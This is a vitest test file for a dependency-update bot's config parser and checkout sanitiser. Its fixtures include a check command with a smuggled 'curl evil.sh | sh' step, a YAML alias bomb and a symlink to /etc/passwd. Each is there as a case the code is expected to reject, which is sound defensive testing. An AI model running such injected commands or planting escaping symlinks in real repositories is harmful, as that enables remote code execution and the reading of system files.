import { mkdir, mkdtemp, readdir, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  commandArgv,
  configIgnores,
  DEFAULT_CONFIG,
  parseConfig,
} from "../../src/config/repo-config.ts";
import { containedPath, sanitizeCheckout } from "../../src/util/safe-fs.ts";

describe(".bumpsmith.yml", () => {
  it("defaults to disabled when there is no file", () => {
    const r = parseConfig(null);
    expect(r.config.enabled).toBe(false);
    expect(r.config.release_age_days).toBe(3);
    expect(r.config.automerge.enabled).toBe(false);
  });

  it("parses the PRD example", () => {
    const r = parseConfig(`version: 1
enabled: true
ecosystems: [npm, pypi]
paths:
  include: ["apps/**", "packages/**"]
  exclude: ["legacy/**"]
limits:
  open_pull_requests: 3
  per_week: 5
release_age_days: 7
ignore:
  - package: "react"
    versions: ["19.x"]
checks:
  test: "pnpm test"
pull_requests:
  labels: ["dependencies", "bumpsmith"]
  draft_below: "high"
`);
    expect(r.problems).toEqual([]);
    expect(r.config.enabled).toBe(true);
    expect(r.config.release_age_days).toBe(7);
    expect(configIgnores(r.config, "react", "19.2.0")).toBe(true);
    expect(configIgnores(r.config, "react", "20.0.0")).toBe(false);
    expect(commandArgv(r.config.checks.test ?? "")).toEqual(["pnpm", "test"]);
  });

  it("can tighten but never loosen safety rules", () => {
    const r = parseConfig("version: 1\nrelease_age_days: 0\npull_requests:\n  draft_below: low\n");
    expect(r.config.release_age_days).toBe(3);
    expect(r.config.pull_requests.draft_below).toBe("medium");
    expect(r.adjustments).toHaveLength(2);
  });

  it("refuses auto-merge, shell operators and unknown keys, with line numbers", () => {
    const r = parseConfig(`version: 1
enabled: true
checks:
  test: "npm test && curl evil.sh | sh"
automerge:
  enabled: true
surprise: 1
`);
    expect(r.config).toEqual(DEFAULT_CONFIG); // invalid file => safe defaults (disabled)
    const byPath = Object.fromEntries(r.problems.map((p) => [p.path, p]));
    expect(byPath["checks.test"]?.line).toBe(4);
    expect(byPath["automerge.enabled"]?.line).toBe(6);
    expect(r.problems.some((p) => /surprise/.test(p.message) || p.path === "")).toBe(true);
  });

  it("reports YAML syntax errors and refuses alias bombs", () => {
    expect(parseConfig("version: 1\n  enabled: [").problems[0]?.line).toBeGreaterThan(0);
    const bomb = `a: &a ["x","x"]\nb: &b [*a,*a]\nc: &c [*b,*b]\nversion: 1\n`;
    expect(parseConfig(bomb).problems.length).toBeGreaterThan(0);
    expect(parseConfig("x".repeat(70_000)).problems[0]?.message).toMatch(/64 KB/);
  });
});

describe("checkout sanitising", () => {
  it("removes symlinks that escape the repository and keeps internal ones", async () => {
    const root = await mkdtemp(join(tmpdir(), "bumpsmith-repo-"));
    await mkdir(join(root, "src"));
    await writeFile(join(root, "src", "a.ts"), "export {}");
    await symlink("/etc/passwd", join(root, "passwd"));
    await symlink("../../..", join(root, "src", "up"));
    await symlink("a.ts", join(root, "src", "alias.ts"));
    const r = await sanitizeCheckout(root);
    expect(r.removedSymlinks.sort()).toEqual(["passwd", "src/up"]);
    expect((await readdir(join(root, "src"))).sort()).toEqual(["a.ts", "alias.ts"]);
    expect(() => containedPath(root, "../x")).toThrow(/escapes/);
    expect(containedPath(root, "src/a.ts")).toBe(join(root, "src", "a.ts"));
  });

  it("refuses oversized checkouts", async () => {
    const root = await mkdtemp(join(tmpdir(), "bumpsmith-repo-"));
    for (let i = 0; i < 5; i++) await writeFile(join(root, `f${i}`), "x");
    await expect(sanitizeCheckout(root, { maxFiles: 3, maxBytes: 1e9 })).rejects.toThrow(
      /more than 3 files/,
    );
  });
});
